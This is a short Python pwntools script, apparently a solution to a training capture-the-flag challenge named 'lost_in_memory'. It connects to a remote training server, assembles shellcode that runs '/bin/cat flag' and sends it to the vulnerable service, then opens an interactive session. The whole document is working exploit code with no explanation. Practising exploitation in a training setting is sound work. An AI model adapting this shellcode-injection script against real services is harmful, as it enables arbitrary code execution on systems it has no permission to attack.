from pwn import *


context.clear(arch='amd64',os='linux')


r=process("./lost_in_memory")
r=remote("bin.training.offdef.it",4001)
sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])

payload = asm(sc)



shellcode = payload

print(shellcode)

r.send(shellcode)



r.interactive()





